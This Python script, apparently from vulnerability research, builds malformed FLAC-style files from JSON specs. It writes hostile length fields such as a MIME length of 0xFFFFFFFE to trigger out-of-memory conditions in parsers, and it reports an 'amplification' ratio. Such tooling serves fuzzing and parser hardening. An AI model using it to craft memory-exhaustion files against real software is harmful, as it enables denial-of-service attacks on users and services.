#!/usr/bin/env python3
"""
build_payload.py - Bottom-up Phase 2: construct payloads from parser specs.
A payload is a SPEC (JSON), not a fuzzed corpus: magic, block headers,
and offset/value pairs for the hostile length field. Rebuildable, diffable.

Usage:
  python3 build_payload.py payloads/flac_picture_oom.json -o out.flac
  python3 build_payload.py my_spec.json --set mime_length=0x1000 -o out.flac

Spec format:
{
  "name": "...",
  "base64": "<prebuilt body>",                # optional fixed template
  "magic": "hex:664c6143",                    # or base64:
  "blocks": [                                 # appended sequentially
    {"type": 0, "last": false, "length_field": "size",
     "body": "hex:..."}
  ],
  "fields": [                                 # absolute-offset writes
    {"offset": 50, "size": 4, "endian": "big",
     "name": "mime_length", "value": "0xFFFFFFFE"}
  ],
  "pad_to": 78
}
CLI overrides: --set name=0xVALUE --set name=123
"""
import argparse, base64, hashlib, json, struct

def decode(s):
    if s.startswith("hex:"):
        return bytes.fromhex(s[4:])
    if s.startswith("base64:"):
        return base64.b64decode(s[7:])
    if s.startswith("str:"):
        return s[4:].encode()
    raise ValueError(f"bad encoding: {s[:20]}")

def parse_val(v):
    if isinstance(v, int):
        return v
    return int(str(v), 0)

def build(spec, overrides):
    data = bytearray()
    if "base64" in spec:
        data += base64.b64decode(spec["base64"])
    elif "magic" in spec:
        data += decode(spec["magic"])
    for blk in spec.get("blocks", []):
        hdr = bytes([(0x80 if blk.get("last") else 0) | blk.get("type", 0)])
        body = decode(blk["body"]) if "body" in blk else bytes(blk.get("body_len", 0))
        hdr += len(body).to_bytes(3, "big")
        data += hdr + body
    fields = {f["name"]: f for f in spec.get("fields", [])}
    for name, raw in overrides.items():
        if name not in fields:
            raise SystemExit(f"[!] unknown field '{name}'; spec has: {list(fields)}")
        fields[name]["value"] = raw
    for f in spec.get("fields", []):
        val = parse_val(f["value"])
        data[f["offset"]:f["offset"] + f["size"]] = \
            val.to_bytes(f["size"], f.get("endian", "big"))
    if "pad_to" in spec and len(data) < spec["pad_to"]:
        data += bytes(spec["pad_to"] - len(data))
    return bytes(data)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("spec")
    ap.add_argument("-o", "--out", required=True)
    ap.add_argument("--set", action="append", default=[], metavar="k=v")
    a = ap.parse_args()
    spec = json.load(open(a.spec))
    overrides = dict(kv.split("=", 1) for kv in a.set)
    d = build(spec, overrides)
    open(a.out, "wb").write(d)
    amp = None
    for f in spec.get("fields", []):
        if overrides.get(f["name"], f.get("value")):
            amp = parse_val(overrides.get(f["name"], f["value"])) / max(len(d), 1)
    print(f"[+] {a.out}: {len(d)} bytes sha256:{hashlib.sha256(d).hexdigest()[:16]}"
          + (f"  amplification {amp:,.0f}x" if amp else ""))

if __name__ == "__main__":
    main()
